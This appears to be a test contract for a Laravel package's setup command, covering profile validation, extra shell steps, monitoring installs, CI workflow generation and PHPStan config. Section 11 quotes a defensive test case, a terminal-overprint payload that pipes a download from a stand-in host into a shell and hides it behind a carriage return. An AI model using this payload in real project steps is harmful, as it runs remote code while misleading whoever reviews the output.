# Gate contract, slice S7 (laravel-layer): profile and CI workflow

Requirements: R11, R13 (profile precedence), R23, R24. Acceptance criteria: AC13, AC14, AC15, AC32. Architecture: AD6 and the profile risk in `internal-docs/specs/2026-11-26-laravel-layer/plan.md`.

The gate is written before the builder starts. The builder implements to this contract and never edits `tests/Profile/`, `tests/Pest.php`, `phpunit.xml.dist` (the `Profile` suite) or `tests/gate/test_s7.py`. A change to the gate goes back to the gate writer. S6 behavior stays as it is (`tests/Setup/` keeps passing).

Run, from the repo root, through DDEV for PHP:

```
ddev exec vendor/bin/pest --filter=Profile      # the PHP gate (tests/Profile/)
python3 -m unittest discover -s tests/gate      # includes test_s7.py: schema bytes, docs
sh scripts/check.sh
```

Tests copy `tests/Fixtures/app` or `tests/Fixtures/package` to a temp dir, write `.ai/skills-profile.json` there, and run `claude-skills:setup {--check} {--yes} {--path=}` against it. No test runs `composer`, `ddev` or the network: a monitoring install is only ever read from the plan (`--check`), or the package is already in `composer.json`.

## 1. The profile file

- Path: `<root>/.ai/skills-profile.json`, root being `--path` (else the S6 root rules). The setup only reads it. It never writes, reformats or deletes it, and keeps every key it does not know.
- Schema: `schema/skills-profile.schema.json`, byte-identical to the Craft pack's file (section 8). The schema leaves `verdicts` and `laravel` as open objects, so the Laravel keys and the verdict entries are validated in code (section 3), not in the schema.
- Top-level keys read by the setup: `version`, `gate_tests` (read by agents, not by the setup; validated), `builders` (validated only), `setup.steps`, `verdicts`, `laravel`. `managed_by` and `craft` are validated by the schema rules only.
- Absent file: the documented defaults (section 2). The file is optional.

## 2. Defaults, and what is stated

`laravel` options and their defaults, also returned by `Michtio\LaravelClaudeSkills\Profile\Profile::load($root)->laravel()` (profile values merged over the defaults, in this key order):

| Key | Values | Default | Effect in the setup |
|---|---|---|---|
| `runner` | `auto`, `ddev`, `host` | `auto` | `auto` follows detection (DDEV when `.ddev/` exists). `ddev` or `host` overrides detection for every runner-dependent file. |
| `house_style` | boolean | `true` | None in the setup. The Boost guideline reads it (S5). A change plans nothing. |
| `phpstan_level` | integer 0 to 10 | `8` | Writes `phpstan.neon` at that level (section 12). |
| `monitoring` | `none`, `sentry`, `nightwatch` | `none` | `sentry` plans `composer require sentry/sentry-laravel`, `nightwatch` plans `composer require laravel/nightwatch` (section 5). `none` plans nothing and never removes a package. |
| `ci` | boolean | `false` | `true` plans `.github/workflows/claude-skills-gate.yml` (section 7). |

Output, on every run (plan, `--check`, `--yes`, "No changes" included), after `Runner: ...` and before the plan:

- no profile file: the line `No profile found at .ai/skills-profile.json; using the defaults:` followed by one line per option, indented, as `  <key>: <value>` (booleans as `true`/`false`, e.g. `  runner: auto`, `  phpstan_level: 8`). The substrings `No profile found at .ai/skills-profile.json` and `using the defaults` and `<key>: <value>` for the five keys (not `env_schema`, section 12) are pinned.
- a profile file: the line `Profile: .ai/skills-profile.json`, and neither `No profile found` nor `using the defaults` anywhere.
- an unknown key inside `laravel`: the line `Ignoring unknown profile key: laravel.<key>`. Unknown keys anywhere else, and the keys themselves, are kept and ignored without a line.

`Profile` API (`src/Profile/Profile.php`): `load(string $root): Profile`, throws `ProfileException` on an invalid file; `exists(): bool`; `laravel(): array` (the table above); `steps(): list<array{name: string, command: string}>`; `verdicts(): array` (the profile's own, as written; `[]` when none).

## 3. Validation

An invalid profile is refused, whatever the options (`--check`, `--yes`, interactive): exit code 1, the output holds `Invalid profile .ai/skills-profile.json: <dotted field path>: <reason>`, and nothing is written (no file created or changed, state file included). The field path is dotted, list items by index: `builders.0.command`, `setup.steps.1.command`, `verdicts.vendor/pkg.use`, `laravel.house_style`. Only the offending field is named. `Profile::load` throws `Michtio\LaravelClaudeSkills\Profile\ProfileException` (a `RuntimeException`) with the same message.

Refused:

- not JSON, not a JSON object, empty file (path `.ai/skills-profile.json`);
- `version` missing or not the integer 1; `gate_tests` not `locked` or `builder-written`; `builders` not a list, an item without string `name` or `command`, `timeout_minutes` not a number above 0; `managed_by` or `setup` not an object; `setup.steps` not a list, a step without string `name` or `command` (the schema's rules);
- `laravel` not an object (a JSON list is not an object); `laravel.runner` not one of `auto`, `ddev`, `host`; `laravel.house_style`, `laravel.ci` not a JSON boolean (a string, an integer or null is refused); `laravel.phpstan_level` not an integer 0 to 10 (a string `"8"` or a float `7.5` is refused); `laravel.monitoring` not `none`, `sentry` or `nightwatch` (a boolean is refused);
- `verdicts` not an object; an entry not an object; `use` not `use`, `avoid` or `depends`; `reason` missing or an empty string; `conditions` not a string; `checked` not a `YYYY-MM-DD` string.

Not refused: unknown keys at any level (AD6, the shared schema: "unknown keys are kept and ignored"), including unknown keys inside `laravel`, which only get the notice of section 2. `conditions` and `checked` are optional.

## 4. Extra steps (`setup.steps`)

- Shown in the plan, after every file diff and after every other `Run:` line, in profile order, each as the line `Extra step: <name>` followed by the line `Run: <command>`. `runLines()` in the tests reads the `Run: ` lines: other actions first, steps last.
- Run only after the plan is confirmed (`--yes` or a yes), never on `--check`, never when declined. Run after every file is written, one by one, in order, as `sh -c <command>` with the project root as working directory. The output line after a run is `Ran <command>`.
- A step that fails (non-zero exit) stops the run: exit 1, a line holding `` `<command>` failed``, later steps not run, files already written stay written. The failed step is not recorded, so a rerun plans it (and the steps after it) again.
- A step that ran is recorded (in `.ai/claude-skills-setup.json`, keyed by the step's name and command; the format is the builder's). A rerun plans only steps that are not recorded: a new step, or one whose name or command changed. A second run on an unchanged project reports `No changes` and exits 0. A removed step plans nothing.
- Steps are planned whether or not other files changed.

## 5. Monitoring

- `sentry`: the `Run:` line `composer require sentry/sentry-laravel` for the host runner, `ddev composer require sentry/sentry-laravel` for DDEV. `nightwatch`: the same with `laravel/nightwatch`. Both packages were checked to exist on Packagist on 2026-11-27.
- It comes before extra steps and after the other actions.
- Not planned when the package is already in `composer.json` `require` or `require-dev` (so the second run is quiet), and never for a Testbench package.
- `none` (the default) plans nothing and never plans a `composer remove`, also when a monitoring package is in `composer.json`.

## 6. Verdicts (R13, AD6)

`Michtio\LaravelClaudeSkills\Profile\Verdicts` (`src/Profile/Verdicts.php`):

- `register(): array` parses `resources/boost/skills/laravel-package-verdicts/references/register.md`: one entry per table row, key the package name without backticks, value `['use' => ..., 'reason' => ..., 'conditions' => ..., 'checked' => ...]` (strings, in that order).
- `merged(string $root): array`: the register with the profile's `verdicts` merged over it by package name. The profile wins: its entry REPLACES the register row for that package as a whole (a `conditions` or `checked` it leaves out is the empty string, not inherited); a package only the profile names is added; every other row is unchanged. Throws `ProfileException` on an invalid profile. No profile or no verdicts: the register as is.
- The setup reads verdicts and writes nothing for them: changing only a verdict leaves the plan empty (`No changes`, exit 0). The "register shows the override" of AC13 is this merged view; agents read it through the skill's precedence rule.
- Option precedence, the same rule one level up: profile value over default (section 2), and the profile `runner` over detection.

## 7. CI workflow (R11, AC32)

- Written only with `laravel.ci` true, at `.github/workflows/claude-skills-gate.yml`, for apps and for Testbench packages, DDEV or host. Owned like every setup file: shown as a diff (`--- /dev/null` then `+++ b/<path>`), recorded in the state file, `edited by hand: <path>` when it differs from what the setup wrote, never replaced without the confirmation, deleted (when still the setup's own output) once `ci` goes back to false.
- Content, checked by parsing the YAML: `on` has `push` and `pull_request`; `permissions` is exactly `contents: read`; every job runs on `ubuntu-latest`; the steps include `actions/checkout`, `shivammathur/setup-php` with a `php-version` of the form `X.Y`, a `composer install ...` line, and exactly one line `composer test`, after the install; no step runs pint, phpstan, pest, phpunit or `artisan test` on its own (the gate is `composer test`, the script of S6).
- Actions, all on their latest major and Node 24, each `uses:` pinned to the major tag. Verified 2026-11-27 with `gh api repos/<owner>/<action>/releases/latest` and the `using:` line of `action.yml`:

| Action | Latest | Pin | `using:` |
|---|---|---|---|
| `actions/checkout` | v7.0.1 | `@v7` | node24 |
| `shivammathur/setup-php` | 2.40.0 | `@v2` | node24 |
| `actions/cache` | v6.1.0 | `@v6` | node24 |

  `actions/cache` is optional; no other action is allowed. A newer latest major at build time is a gate change (re-verify, then update the table in `ProfileCiWorkflowTest.php` through the gate writer), not a builder decision.

## 8. Schema and docs

- `schema/skills-profile.schema.json` is the Craft pack's file, byte for byte: `michtio/craftcms-claude-skills`, `main` at `48f0c241db45bacb0e9d6668afaeafb6473a7143` (merge of PR #32; the file is not in the v1.31.0 tag) with `"pattern": "^[A-Za-z0-9._-]{1,64}$"` added to `builders.items.properties.name` (ruled 2026-11-28, the same edit in both packs), blob `4cbce501a9aad3f83f02f4435c9b0d6b9948ca0e`, sha256 `39b36ee7899fcae616cfd0c050e31325e3a6d88cc391abbdb32ccdbef8102023`. The builder copies it (`git -C <craft repo> show main:schema/skills-profile.schema.json`), never edits it.
- `docs/profile.md` names the path `.ai/skills-profile.json`, `claude-skills:setup` and `--check`; every property name of the schema in backticks (`version`, `managed_by`, `gate_tests`, `builders`, `name`, `command`, `timeout_minutes`, `setup`, `steps`, `verdicts`, `craft`, `answers`, `choices`, `hosting`, `passwordless`, `dev_root`, `chrome_devtools_mcp`, `craft_mcp`, `laravel`, `tool`); the five `laravel` keys, each on a line that also holds its default in backticks (`` `auto` ``, `` `true` ``, `` `8` ``, `` `none` ``, `` `false` ``); the enum values in backticks (`auto`, `ddev`, `host`, `sentry`, `nightwatch`, `none`, `locked`, `builder-written`); the phrases "unknown keys", "precedence", "default", "rerun", the workflow path and `composer test`; that a profile verdict replaces the register row. No model or vendor name.

## 9. Exit codes

| Case | Exit |
|---|---|
| Applied, declined, or nothing to do | 0 |
| `--check`, nothing would change (no file, no action, no pending step) | 0 |
| `--check`, anything would change (a diff, a `Run:` line, a pending step) | 1 |
| Invalid profile, with or without `--check` | 1 |
| A step or an action failed | 1 |
| Project root missing, or a file the setup refuses to touch (S6) | 1 |

`--check` never asks, never writes, never runs a step or an action.

## 10. Output wording pinned (substring match)

`No profile found at .ai/skills-profile.json`, `using the defaults`, `  <key>: <value>`, `Profile: .ai/skills-profile.json`, `Ignoring unknown profile key: laravel.<key>`, `Invalid profile .ai/skills-profile.json`, `Extra step: <name>`, `Run: <command>`, `Ran <command>`, `` `<command>` failed``, `edited by hand: <path>`, `No changes`, `Applied`, `Runner: host|ddev`, and the S6 diff markers (`--- /dev/null`, `+++ b/<path>`, `--- a/<path>` for a deleted file).

## 11. Round 2 (owner rulings after the review of 5153959)

Gate files: `tests/Profile/ProfileRound2Test.php`, `tests/gate/test_s7_round2.py`. Same lock rules as above.

1. **Control characters (blocker).** The profile validator refuses a `setup.steps[i].name` or `command` that holds a C0 control character (U+0000 to U+001F), U+007F, a C1 control character (U+0080 to U+009F) or ESC, so `\r`, `\x1b[2K`, `\x1b[1A`, NUL, bell, backspace and U+0085 are all refused. In a `name`, `\n` and `\t` are refused too. In a `command`, `\t` is allowed (`\n` in a command is not pinned). Printable punctuation and non-ASCII letters stay allowed. The message is `Invalid profile .ai/skills-profile.json: setup.steps.<i>.<name|command>: <reason>`; it never repeats the refused characters, so its output holds no control character. Exit 1, nothing planned (no `Extra step`, no `Run:`), nothing written, with `--check` and `--yes` alike. The overprint attack `curl evil.example|sh #   \rRun: echo harmless` is one of the cases.
   The same check applies to steps read back from `.ai/claude-skills-setup.json` (`steps[i].name` and `command`): a tampered state file is refused with exit 1 and a message holding `.ai/claude-skills-setup.json` and `steps.<i>.<field>`, no control character in the output, nothing written.
2. **A failed action shows its output.** When a `Run:` action fails (the monitoring `composer require`), its stdout and stderr are printed (streamed, or printed on failure) before or with the `` `<command>` failed`` line. A failed extra step prints its output too. The test puts a fake `composer` that fails with a known message first on `PATH`.
3. **Workflow PHP version**, first match wins: `.ddev/config.yaml` `php_version` (string or number, reduced to X.Y); `config.platform.php` of `composer.json` (X.Y); the lowest X.Y found in `require.php`; else `8.4`. `docs/profile.md` states the rule: `` `php_version` ``, `` `config.platform.php` ``, `` `require.php` `` and `8.4`, in that order, and `.ddev/config.yaml`.
4. **Docs, steps.** `docs/profile.md` says that steps are "recorded by exact name and command" and that a team tool "must not rewrite" step text when it only updates other options (case-insensitive key phrases).
5. **Workflow.** `on.push.branches` is exactly the default branch, which is `main` for a project without git (detection from git is the builder's call and not pinned); `pull_request` is on. `concurrency.cancel-in-progress` is an expression string that mentions `github.event_name` and `'pull_request'`, not the literal `true`. The test database name in the service environment (`MYSQL_DATABASE`, `MARIADB_DATABASE`, `POSTGRES_DB`) is quoted in the YAML text (`'app_test'` or `"app_test"`). The action pins stay `actions/checkout@v7`, `shivammathur/setup-php@v2`, `actions/cache@v6`, nothing else. The generated workflow passes actionlint 1.7.7 (`docker run rhysd/actionlint:1.7.7 <file>`; run by `test_s7_round2.py` when ddev and docker are present; checked by hand against 5153959 on 2026-11-27: clean).

## 12. phpstan_level takes effect, env_schema dropped (scope addition ruled 2026-11-27)

Gate files: `tests/Profile/ProfileLevelTest.php`; amended cases listed at the end. Same lock rules.

**When the setup manages PHPStan.** Only for a project that is on Larastan (`larastan/larastan` in `require` or `require-dev`) or whose profile sets `laravel.phpstan_level` explicitly. For any other project (the S6 fixtures, a repo with no PHPStan and no level in its profile) the setup plans nothing about PHPStan and prints nothing. This is the gate writer's reading of "the default is 8": the default applies when the setup manages PHPStan and the profile gives no level. A literal "always write it" would plan `composer require` in every default run, and every S6 test that applies with `--yes` would run composer; the owner confirms or overrules.

**The file.** When managed and none of `phpstan.neon`, `phpstan.neon.dist`, `phpstan.dist.neon` exists, the setup plans and writes `phpstan.neon`:

```
includes:
    - vendor/larastan/larastan/extension.neon
    - vendor/michtio/laravel-claude-skills/extension.neon

parameters:
    level: <level>
    paths:
        - ...
```

The two includes are exactly these, in this order: Larastan's own `extension.neon`, then the pack's (the path its `extension.neon` header tells users to include). `paths` for an app: those of `app`, `config`, `database`, `routes` that exist as directories, in that order, or `app` when none does; for a Testbench package: `src`. The text parses as YAML (spaces, no tabs).

**Existing config.** An existing `phpstan.neon`, `phpstan.neon.dist` or `phpstan.dist.neon` is never changed, never duplicated and never gets an install planned, whatever its level. The setup prints `Left alone: <file>` (substring pinned, followed by free text such as "laravel.phpstan_level is not applied to an existing PHPStan config") on every run of a managed project that has one.

**Owned.** The written `phpstan.neon` is owned like the other files: recorded in the state file; `No changes` on a rerun; `edited by hand: phpstan.neon` and a diff after a hand edit. A changed `phpstan_level` plans only that file (and the state), and applying it makes `--check` exit 0. A file that exists and was not written by the setup is "existing config" above.

**Larastan missing.** When the file is planned and `larastan/larastan` is not required, the setup plans the `Run:` line `composer require --dev larastan/larastan` (`ddev composer require --dev larastan/larastan` on DDEV), also for a Testbench package, after the other actions and before the extra steps (like monitoring, section 5). Never planned when the package is already required; never removed. Tests that apply put Larastan into `composer.json` first, so no test runs composer.

**env_schema.** It is no longer a Laravel key: any value is accepted (never refused), kept byte for byte in the file, ignored, and the existing notice `Ignoring unknown profile key: laravel.env_schema` is printed. `Profile::load()->laravel()` has five keys, in this order: `runner`, `house_style`, `phpstan_level`, `monitoring`, `ci`. The defaults statement lists those five and not `env_schema`. `docs/profile.md` no longer mentions `env_schema`.

**Authorised gate amendments** (cases that pinned `env_schema` as a known key, amended as ruled):
- `tests/Profile/ProfileValidationTest.php`: dataset row `'env_schema a string'` (was line 46) removed (it is now accepted and ignored; `ProfileLevelTest` covers it); dataset row `'env schema on'` of "accepts every documented laravel value" (was line 158) removed (the key is no longer in `laravel()`).
- `tests/Profile/ProfileDefaultsTest.php`: line 25 `->toContain('env_schema: false')` became `->not->toContain('env_schema')`; the two `'env_schema' => false` entries of the expected `laravel()` arrays (were lines 81 and 100) removed.
- `tests/gate/test_s7.py`: `LARAVEL_KEYS` loses `env_schema` (was line 32), so the docs test no longer requires it.
- `tests/Profile/CONTRACT.md`: the table row of section 2, the validation list of section 3, the defaults lines and the docs list of section 8, as above.

## 13. Round 3 (final review findings)

Gate file: `tests/Profile/ProfileRound3Test.php`. Same lock rules.

1. **phpstan/extension-installer.** When `phpstan/extension-installer` is in `require` or `require-dev`, the written `phpstan.neon` has no `includes` block at all (the installer already includes Larastan's and this pack's extensions, and including them twice makes PHPStan exit 1 with "These files are included multiple times"); `parameters` (level, paths) stay. Without the installer the includes are as in section 12. The file follows the installer: adding or removing it after the setup wrote the file plans a plain change of `phpstan.neon` (no "edited by hand"), and applying it makes `--check` exit 0. The same for a package, and for the planned diff when Larastan is not installed yet. No real PHPStan run is pinned: the fixtures have no vendor tree and the gate may not run composer.
2. **A recorded `phpstan.neon` the user replaced.** The existing hand-edit wording stays (`edited by hand: <path>` and the note under it). For `phpstan.neon` the plan also holds the line `phpstan.neon: applying replaces your changes with level <n>`, `<n>` being the level the apply writes (profile level, else 8), shown before the diff. Nothing is written with `--check` or when the confirmation is declined; a yes replaces the file.
3. **Paths for a Testbench project without the S6 markers.** Detection stays as S6 locks it (AD5: package = `orchestra/testbench` in `require` or `require-dev` plus a `workbench/` directory; `tests/Setup/SetupCommandTest.php` pins "testbench without a workbench directory is an app"). So a project with testbench in `require-dev`, no `artisan`, no `bootstrap/app.php`, no `workbench/` and a `src/` folder is still `Detected: app`. What changes is the path rule for an app: the existing ones of `app`, `config`, `database`, `routes`; when none exists, `src` if that directory exists; else `app`. A package (with `workbench/`) is `src`. The app directories win over `src` when both exist.
